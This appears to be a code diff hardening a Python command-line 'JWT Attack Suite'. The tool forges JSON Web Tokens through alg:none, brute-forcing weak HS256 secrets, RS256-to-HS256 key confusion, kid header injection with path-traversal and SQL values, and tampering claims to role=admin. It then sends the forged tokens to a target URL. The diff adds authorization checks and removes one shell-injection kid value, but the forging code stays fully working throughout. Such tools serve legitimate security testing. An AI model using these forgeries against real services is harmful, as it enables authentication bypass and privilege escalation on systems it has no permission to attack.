@@ -1,96 +1,131 @@
 #!/usr/bin/env python3
-"""
-JWT Attack Suite - by amooryx
-A comprehensive CLI tool for testing JWT vulnerabilities.
-"""
+"""JWT Attack Suite - authorized JWT security-audit probes."""
 
+import argparse
 import base64
+import binascii
 import hashlib
 import hmac
 import json
+import re
 import sys
-import argparse
-import itertools
-import string
 from typing import Optional
+from urllib.parse import urlsplit
 
 try:
     import requests
-    import httpx
 except ImportError:
-    print("[!] Missing deps: pip install requests httpx")
-    sys.exit(1)
+    requests = None
 
 
 BANNER = r"""
-     _ __        __  ___   __  __            __      _____       _ __     
-    (_) /  ___  /  |/  /  / / / /___  ____  / /__   / ___/__  __(_) /____ 
+     _ __        __  ___   __  __            __      _____       _ __
+    (_) /  ___  /  |/  /  / / / /___  ____  / /__   / ___/__  __(_) /____
    / / /  / _ \/ /|_/ /  / /_/ / __ \/ __ \/ //_/   \__ \/ / / / / __/ _ \
-  / / /__/  __/ /  / /  / __  / /_/ / /_/ / ,<     ___/ / /_/ / / /_/  __/
- /_/____/\___/_/  /_/  /_/ /_/\____/\____/_/|_|   /____/\__,_/_/\__/\___/ 
-                                                                            
+  / /__/ /  __/ /  / /  / __  / /_/ / /_/ / ,<     ___/ / /_/ / / /_/  __/
+ /_/____/\___/_/  /_/  /_/ /_/\____/\____/_/|_|   /____/\__,_/_/\__/\___/
+
   JWT Attack Suite v1.0 | by amooryx
 """
 
-# ─────────────────────────────────────────────
-#  Helpers
-# ─────────────────────────────────────────────
+
+class TokenFormatError(ValueError):
+    """Raised when a compact JWT is malformed or is not JSON-object based."""
+
+
+def _json_object(pairs):
+    result = {}
+    for key, value in pairs:
+        if key in result:
+            raise TokenFormatError(f"duplicate JSON member: {key}")
+        result[key] = value
+    return result
+
+
+def _reject_json_constant(value):
+    raise TokenFormatError(f"invalid JSON constant: {value}")
+
 
 def b64url_decode(data: str) -> bytes:
-    padding = 4 - len(data) % 4
-    return base64.urlsafe_b64decode(data + "=" * padding)
+    if not isinstance(data, str) or not re.fullmatch(r"[A-Za-z0-9_-]*", data):
+        raise TokenFormatError("JWT segments must use unpadded base64url characters")
+    if len(data) % 4 == 1:
+        raise TokenFormatError("invalid base64url segment length")
+    try:
+        decoded = base64.b64decode(
+            data + "=" * (-len(data) % 4), altchars=b"-_", validate=True
+        )
+    except (binascii.Error, ValueError) as exc:
+        raise TokenFormatError("invalid base64url segment") from exc
+    if b64url_encode(decoded) != data:
+        raise TokenFormatError("non-canonical base64url segment")
+    return decoded
 
 
 def b64url_encode(data: bytes) -> str:
-    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
 
 
 def decode_token(token: str):
+    if not isinstance(token, str):
+        raise TokenFormatError("token must be text")
     parts = token.split(".")
     if len(parts) != 3:
-        print("[!] Invalid JWT format")
-        sys.exit(1)
+        raise TokenFormatError("JWT must contain exactly three dot-separated segments")
     try:
-        header = json.loads(b64url_decode(parts[0]))
-        payload = json.loads(b64url_decode(parts[1]))
-    except Exception as e:
-        print(f"[!] Failed to decode token: {e}")
-        sys.exit(1)
+        header = json.loads(
+            b64url_decode(parts[0]),
+            object_pairs_hook=_json_object,
+            parse_constant=_reject_json_constant,
+        )
+        payload = json.loads(
+            b64url_decode(parts[1]),
+            object_pairs_hook=_json_object,
+            parse_constant=_reject_json_constant,
+        )
+        b64url_decode(parts[2])
+    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
+        raise TokenFormatError("JWT header and payload must contain valid UTF-8 JSON") from exc
+    if not isinstance(header, dict):
+        raise TokenFormatError("JWT header must be a JSON object")
+    if not isinstance(payload, dict):
+        raise TokenFormatError("JWT payload must be a JSON object")
+    if not isinstance(header.get("alg"), str) or not header["alg"]:
+        raise TokenFormatError("JWT header must contain a non-empty string 'alg'")
     return header, payload, parts
 
 
 def print_token_info(token: str):
     header, payload, _ = decode_token(token)
-    print("\n[*] Token Decoded:")
-    print(f"  Header  : {json.dumps(header, indent=4)}")
-    print(f"  Payload : {json.dumps(payload, indent=4)}")
+    print("\n[*] Decoded token metadata (claim values are withheld):")
+    print(f"  Algorithm      : {header['alg']}")
+    print(f"  Header fields  : {', '.join(sorted(header)) or '(none)'}")
+    print(f"  Payload claims : {', '.join(sorted(payload)) or '(none)'}")
 
 
-# ─────────────────────────────────────────────
-#  Attack 1: alg:none
-# ─────────────────────────────────────────────
+def _encode_json(value: dict) -> str:
+    return b64url_encode(
+        json.dumps(value, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
+    )
+
+
+def _report_candidate(url: Optional[str], header_name: str, token: str, attack_name: str):
+    print(f"  [+] Generated {attack_name} candidate (not validated by a server).")
+    if url:
+        _send_and_report(url, header_name, token, attack_name)
+
 
 def attack_alg_none(token: str, url: Optional[str], header_name: str) -> str:
-    print("\n[*] Attack: alg:none")
-    header, payload, _ = decode_token(token)
-
-    for alg_val in ["none", "None", "NONE", "nOnE"]:
+    print("\n[*] Candidate generation: alg:none")
+    _, payload, _ = decode_token(token)
+    forged = ""
+    for alg_val in ("none", "None", "NONE", "nOnE"):
+        header, _, _ = decode_token(token)
         header["alg"] = alg_val
-        new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
-        new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-        forged = f"{new_header}.{new_payload}."
-
-        print(f"  [+] Forged token (alg={alg_val}): {forged[:60]}...")
-
-        if url:
-            _send_and_report(url, header_name, forged, f"alg:{alg_val}")
-
+        forged = f"{_encode_json(header)}.{_encode_json(payload)}."
+        _report_candidate(url, header_name, forged, f"alg:{alg_val}")
     return forged
 
-
-# ─────────────────────────────────────────────
-#  Attack 2: Weak Secret Brute Force (HS256)
-# ─────────────────────────────────────────────
 
 COMMON_SECRETS = [
     "secret", "password", "123456", "qwerty", "admin", "test",
@@ -100,76 +135,68 @@ COMMON_SECRETS = [
 
 
 def sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
-    msg = f"{header_b64}.{payload_b64}".encode()
-    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
-    return b64url_encode(sig)
+    message = f"{header_b64}.{payload_b64}".encode("ascii")
+    signature = hmac.new(secret.encode("utf-8"), message, hashlib.sha256).digest()
+    return b64url_encode(signature)
 
 
-def attack_brute_force(token: str, wordlist: Optional[str], url: Optional[str], header_name: str):
-    print("\n[*] Attack: Weak Secret Brute Force (HS256)")
-    _, _, parts = decode_token(token)
-    header_b64, payload_b64, sig_b64 = parts
+def attack_brute_force(
+    token: str, wordlist: Optional[str], url: Optional[str], header_name: str
+):
+    print("\n[*] Offline check: common HS256 signing secrets")
+    header, _, parts = decode_token(token)
+    if header["alg"] != "HS256":
+        print("  [!] Skipped: this check only supports tokens declaring HS256.")
+        return None
 
     secrets = COMMON_SECRETS.copy()
     if wordlist:
         try:
-            with open(wordlist, "r", errors="ignore") as f:
-                secrets += [line.strip() for line in f if line.strip()]
-            print(f"  [+] Loaded {len(secrets)} secrets from wordlist")
-        except FileNotFoundError:
-            print(f"  [!] Wordlist not found: {wordlist}")
+            with open(wordlist, "r", encoding="utf-8", errors="ignore") as word_file:
+                secrets.extend(line.strip() for line in word_file if line.strip())
+        except OSError as exc:
+            print(f"  [!] Could not read wordlist ({exc.__class__.__name__}).")
+            return None
 
     for secret in secrets:
-        computed = sign_hs256(header_b64, payload_b64, secret)
-        if computed == sig_b64:
-            print(f"  [!!!] SECRET FOUND: '{secret}'")
-            if url:
-                _send_and_report(url, header_name, token, f"brute({secret})")
+        computed = sign_hs256(parts[0], parts[1], secret)
+        if hmac.compare_digest(computed, parts[2]):
+            print("  [!] A supplied/common weak signing secret matches; value withheld.")
             return secret
 
-    print("  [-] No weak secret found in list")
+    print("  [-] No matching secret found in the supplied list.")
     return None
 
 
-# ─────────────────────────────────────────────
-#  Attack 3: RS256 → HS256 Confusion
-# ─────────────────────────────────────────────
-
-def attack_rs256_hs256(token: str, pubkey_file: str, url: Optional[str], header_name: str):
-    print("\n[*] Attack: RS256 → HS256 Algorithm Confusion")
-    try:
-        with open(pubkey_file, "rb") as f:
-            pubkey = f.read()
-    except FileNotFoundError:
-        print(f"  [!] Public key file not found: {pubkey_file}")
-        return
-
+def attack_rs256_hs256(
+    token: str, pubkey_file: str, url: Optional[str], header_name: str
+):
+    print("\n[*] Candidate generation: RS256 to HS256 confusion")
     header, payload, _ = decode_token(token)
+    if header["alg"] != "RS256":
+        print("  [!] Skipped: the input token must declare RS256.")
+        return None
+    try:
+        with open(pubkey_file, "rb") as key_file:
+            public_key = key_file.read()
+    except OSError as exc:
+        print(f"  [!] Could not read public key file ({exc.__class__.__name__}).")
+        return None
+
     header["alg"] = "HS256"
-
-    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
-    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-
-    msg = f"{new_header}.{new_payload}".encode()
-    sig = hmac.new(pubkey, msg, hashlib.sha256).digest()
-    forged = f"{new_header}.{new_payload}.{b64url_encode(sig)}"
-
-    print(f"  [+] Forged token (RS256→HS256): {forged[:60]}...")
-
-    if url:
-        _send_and_report(url, header_name, forged, "RS256→HS256")
-
+    header_b64 = _encode_json(header)
+    payload_b64 = _encode_json(payload)
+    signature = hmac.new(
+        public_key, f"{header_b64}.{payload_b64}".encode("ascii"), hashlib.sha256
+    ).digest()
+    forged = f"{header_b64}.{payload_b64}.{b64url_encode(signature)}"
+    _report_candidate(url, header_name, forged, "RS256-to-HS256")
     return forged
 
-
-# ─────────────────────────────────────────────
-#  Attack 4: kid Header Injection
-# ─────────────────────────────────────────────
 
 KID_PAYLOADS = [
     "../../dev/null",
     "/dev/null",
-    "| sleep 5",
     "'; SELECT 1--",
     "../../../etc/passwd",
     "/proc/self/fd/0",
@@ -177,130 +204,161 @@ KID_PAYLOADS = [
 
 
 def attack_kid_injection(token: str, url: Optional[str], header_name: str):
-    print("\n[*] Attack: kid Header Injection")
+    print("\n[*] Candidate generation: kid lookup handling")
+    _, payload, _ = decode_token(token)
+    candidates = []
+    for kid_value in KID_PAYLOADS:
+        header, _, _ = decode_token(token)
+        header["kid"] = kid_value
+        header_b64 = _encode_json(header)
+        payload_b64 = _encode_json(payload)
+        signature = sign_hs256(header_b64, payload_b64, "")
+        forged = f"{header_b64}.{payload_b64}.{signature}"
+        candidates.append(forged)
+        _report_candidate(url, header_name, forged, "kid-lookup")
+    return candidates
+
+
+def attack_claim_tamper(
+    token: str, claims: dict, url: Optional[str], header_name: str
+):
+    print("\n[*] Candidate generation: unsigned claim modification")
     header, payload, _ = decode_token(token)
-
-    for kid_val in KID_PAYLOADS:
-        header["kid"] = kid_val
-        # sign with empty string (null key path exploitation)
-        new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
-        new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-        sig = sign_hs256(new_header, new_payload, "")
-        forged = f"{new_header}.{new_payload}.{sig}"
-
-        print(f"  [+] kid='{kid_val}' → {forged[:50]}...")
-
-        if url:
-            _send_and_report(url, header_name, forged, f"kid={kid_val}")
-
-
-# ─────────────────────────────────────────────
-#  Attack 5: Claim Tampering (privilege escalation)
-# ─────────────────────────────────────────────
-
-def attack_claim_tamper(token: str, claims: dict, url: Optional[str], header_name: str):
-    print("\n[*] Attack: Claim Tampering (unsigned modification)")
-    header, payload, _ = decode_token(token)
-
-    print(f"  [*] Original claims: {payload}")
+    if not isinstance(claims, dict) or any(
+        not isinstance(key, str) or not key for key in claims
+    ):
+        raise ValueError("claim names must be non-empty strings")
     payload.update(claims)
-    print(f"  [+] Modified claims: {payload}")
-
-    # Forge with alg:none
     header["alg"] = "none"
-    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
-    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-    forged = f"{new_header}.{new_payload}."
-
-    print(f"  [+] Forged token: {forged[:60]}...")
-
-    if url:
-        _send_and_report(url, header_name, forged, "claim-tamper")
-
+    forged = f"{_encode_json(header)}.{_encode_json(payload)}."
+    _report_candidate(url, header_name, forged, "claim-tamper")
     return forged
 
 
-# ─────────────────────────────────────────────
-#  HTTP Helper
-# ─────────────────────────────────────────────
+def validate_target(url: str, header_name: str):
+    if any(ord(char) < 32 or ord(char) == 127 for char in url):
+        raise ValueError("target URL must not contain control characters")
+    try:
+        parsed = urlsplit(url)
+        _ = parsed.port
+    except ValueError as exc:
+        raise ValueError("target URL is malformed") from exc
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        raise ValueError("target must be an absolute http:// or https:// URL")
+    if parsed.username is not None or parsed.password is not None:
+        raise ValueError("target URL must not contain embedded credentials")
+    if parsed.fragment:
+        raise ValueError("target URL must not contain a fragment")
+    if not re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]+", header_name):
+        raise ValueError("header name must be a valid HTTP token")
+    if requests is None:
+        raise RuntimeError("requests is required for HTTP probes; install requirements.txt")
+
 
 def _send_and_report(url: str, header_name: str, token: str, attack_name: str):
+    headers = {header_name: f"Bearer {token}"}
     try:
-        headers = {header_name: f"Bearer {token}"}
-        r = requests.get(url, headers=headers, timeout=10, verify=False)
-        status = r.status_code
-        indicator = "✓ POSSIBLE BYPASS" if status in [200, 201, 302] else "✗ Rejected"
-        print(f"    → [{attack_name}] HTTP {status} {indicator}")
-    except requests.exceptions.RequestException as e:
-        print(f"    → [{attack_name}] Request failed: {e}")
-
-
-# ─────────────────────────────────────────────
-#  CLI
-# ─────────────────────────────────────────────
-
-def main():
-    print(BANNER)
-
-    parser = argparse.ArgumentParser(
-        description="JWT Attack Suite - Test JWTs for common vulnerabilities",
-        formatter_class=argparse.RawTextHelpFormatter
-    )
-    parser.add_argument("-t", "--token", required=True, help="JWT token to test")
-    parser.add_argument("-u", "--url", help="Target URL to send forged tokens to")
-    parser.add_argument("-H", "--header", default="Authorization", help="HTTP header name (default: Authorization)")
-    parser.add_argument("-w", "--wordlist", help="Path to wordlist for brute force")
-    parser.add_argument("-p", "--pubkey", help="Public key file for RS256→HS256 attack")
-    parser.add_argument("--set-claim", nargs=2, action="append", metavar=("KEY", "VALUE"),
-                        help="Tamper a claim: --set-claim role admin")
-    parser.add_argument("--attack", default="all",
-                        choices=["all", "none", "brute", "rs256", "kid", "tamper"],
-                        help="Which attack to run (default: all)")
-    parser.add_argument("--info", action="store_true", help="Just decode and display token info")
-
-    args = parser.parse_args()
-
-    if args.info:
-        print_token_info(args.token)
+        response = requests.get(
+            url,
+            headers=headers,
+            timeout=(3.05, 10),
+            verify=True,
+            allow_redirects=False,
+        )
+    except requests.exceptions.RequestException as exc:
+        print(f"    [?] [{attack_name}] Probe failed ({exc.__class__.__name__}); inconclusive.")
         return
+    print(
+        f"    [?] [{attack_name}] HTTP {response.status_code}; "
+        "inconclusive—status alone cannot confirm JWT acceptance or bypass."
+    )
 
-    print_token_info(args.token)
 
-    run_all = args.attack == "all"
+def build_parser():
+    parser = argparse.ArgumentParser(
+        description="Generate offline JWT audit candidates and optionally send authorized probes."
+    )
+    parser.add_argument("-t", "--token", required=True, help="JWT to inspect")
+    parser.add_argument("-u", "--url", help="Target URL for active probes")
+    parser.add_argument(
+        "--authorized",
+        action="store_true",
+        help="Acknowledge that you are authorized to probe the target in --url",
+    )
+    parser.add_argument(
+        "-H", "--header", default="Authorization", help="JWT request header name"
+    )
+    parser.add_argument("-w", "--wordlist", help="Path to an offline HS256 secret wordlist")
+    parser.add_argument("-p", "--pubkey", help="Public key file for RS256-to-HS256 candidate")
+    parser.add_argument(
+        "--set-claim", nargs=2, action="append", metavar=("KEY", "VALUE"),
+        help="Add/replace a claim in the unsigned candidate",
+    )
+    parser.add_argument(
+        "--attack", default="all",
+        choices=("all", "none", "brute", "rs256", "kid", "tamper"),
+        help="Check to run (default: all)",
+    )
+    parser.add_argument("--info", action="store_true", help="Show safe token metadata only")
+    return parser
 
-    if run_all or args.attack == "none":
-        attack_alg_none(args.token, args.url, args.header)
 
-    if run_all or args.attack == "brute":
-        attack_brute_force(args.token, args.wordlist, args.url, args.header)
+def _claim_value(value: str):
+    if value.lower() == "true":
+        return True
+    if value.lower() == "false":
+        return False
+    if re.fullmatch(r"-?(0|[1-9][0-9]*)", value):
+        try:
+            return int(value)
+        except ValueError:
+            pass
+    return value
 
-    if (run_all or args.attack == "rs256") and args.pubkey:
-        attack_rs256_hs256(args.token, args.pubkey, args.url, args.header)
-    elif args.attack == "rs256" and not args.pubkey:
-        print("[!] RS256→HS256 attack requires --pubkey")
 
-    if run_all or args.attack == "kid":
-        attack_kid_injection(args.token, args.url, args.header)
+def main(argv=None):
+    parser = build_parser()
+    args = parser.parse_args(argv)
 
-    if run_all or args.attack == "tamper":
-        claims = {}
-        if args.set_claim:
-            for key, val in args.set_claim:
-                # try to cast to int/bool if possible
-                if val.lower() == "true":
-                    val = True
-                elif val.lower() == "false":
-                    val = False
-                elif val.isdigit():
-                    val = int(val)
-                claims[key] = val
-        else:
-            claims = {"role": "admin", "is_admin": True}
+    if args.url and not args.authorized:
+        parser.error("--url requires --authorized; active probes must be explicitly authorized")
+    if args.authorized and not args.url:
+        parser.error("--authorized requires --url")
+    if args.url:
+        try:
+            validate_target(args.url, args.header)
+        except (ValueError, RuntimeError) as exc:
+            parser.error(str(exc))
 
-        attack_claim_tamper(args.token, claims, args.url, args.header)
-
-    print("\n[*] Done.")
+    try:
+        print(BANNER)
+        print_token_info(args.token)
+        if args.info:
+            return 0
+        if args.attack in ("all", "none"):
+            attack_alg_none(args.token, args.url, args.header)
+        if args.attack in ("all", "brute"):
+            attack_brute_force(args.token, args.wordlist, args.url, args.header)
+        if args.attack in ("all", "rs256"):
+            if args.pubkey:
+                attack_rs256_hs256(args.token, args.pubkey, args.url, args.header)
+            elif args.attack == "rs256":
+                parser.error("--attack rs256 requires --pubkey")
+        if args.attack in ("all", "kid"):
+            attack_kid_injection(args.token, args.url, args.header)
+        if args.attack in ("all", "tamper"):
+            claims = {
+                key: _claim_value(value) for key, value in (args.set_claim or [])
+            }
+            if not claims:
+                claims = {"role": "admin", "is_admin": True}
+            attack_claim_tamper(args.token, claims, args.url, args.header)
+        print("\n[*] Done. Generated candidates are not evidence of a vulnerability.")
+        return 0
+    except (TokenFormatError, ValueError) as exc:
+        print(f"[!] Invalid input: {exc}", file=sys.stderr)
+        return 2
 
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
